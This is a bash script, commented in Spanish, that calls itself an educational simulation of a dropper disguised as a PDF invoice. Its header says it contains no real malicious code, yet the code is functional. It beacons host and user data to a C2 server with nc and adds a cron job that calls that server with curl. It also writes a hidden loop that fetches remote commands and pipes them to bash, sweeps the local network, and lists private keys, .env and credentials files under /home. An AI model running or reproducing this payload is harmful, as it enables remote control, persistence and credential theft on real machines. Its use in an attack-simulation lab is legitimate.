#!/bin/bash
###############################################################################
# PAYLOAD MALICIOSO SIMULADO - "factura_pendiente.pdf.sh"
# 
# Este script simula un dropper/stager que:
# 1. Se disfraza como un PDF (doble extensión)
# 2. Establece comunicación C2
# 3. Descarga herramientas adicionales
# 4. Instala persistencia
# 5. Inicia reconocimiento
#
# ⚠️ SOLO PARA USO EDUCATIVO - NO CONTIENE CÓDIGO MALICIOSO REAL ⚠️
###############################################################################

# Simular que "abre" un PDF (distracción)
echo "[*] Opening document..." > /dev/null

# === STAGE 1: Establecer C2 ===
C2_SERVER="10.10.10.200"
C2_PORT="4444"
HOSTNAME=$(hostname)
WHOAMI=$(whoami)

# Beacon inicial
(echo "${HOSTNAME}|${WHOAMI}|$(date +%s)|stage1" | nc -w 2 ${C2_SERVER} ${C2_PORT} 2>/dev/null) &

# === STAGE 2: Recolección de información ===
{
    echo "=== SYSTEM INFO ==="
    uname -a
    echo "=== USERS ==="
    cat /etc/passwd | grep -v nologin
    echo "=== NETWORK ==="
    ip addr
    echo "=== PROCESSES ==="
    ps aux | head -30
} > /tmp/.sysinfo_$(hostname) 2>/dev/null

# === STAGE 3: Persistencia ===
# Crontab
(crontab -l 2>/dev/null; echo "*/10 * * * * curl -s http://${C2_SERVER}:8080/beacon?h=${HOSTNAME} > /dev/null 2>&1") | crontab - 2>/dev/null

# Hidden script
cat > /tmp/.updater.sh << 'INNER'
#!/bin/bash
while true; do
    curl -s http://10.10.10.200:8080/tasks/$(hostname) | bash 2>/dev/null
    sleep 300
done
INNER
chmod +x /tmp/.updater.sh
nohup /tmp/.updater.sh > /dev/null 2>&1 &

# === STAGE 4: Reconocimiento de red ===
for i in $(seq 100 110); do
    (ping -c 1 -W 1 10.10.10.${i} > /dev/null 2>&1 && echo "10.10.10.${i} ALIVE" >> /tmp/.network_map) &
done

# === STAGE 5: Preparar movimiento lateral ===
# Buscar credenciales
find /home -name "id_rsa" -o -name "*.env" -o -name "credentials*" 2>/dev/null > /tmp/.found_creds

# Log del payload
echo "{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)\",\"event\":\"payload_executed\",\"hostname\":\"${HOSTNAME}\",\"user\":\"${WHOAMI}\",\"stages_completed\":5}" >> /var/log/attack_simulation.log 2>/dev/null

exit 0
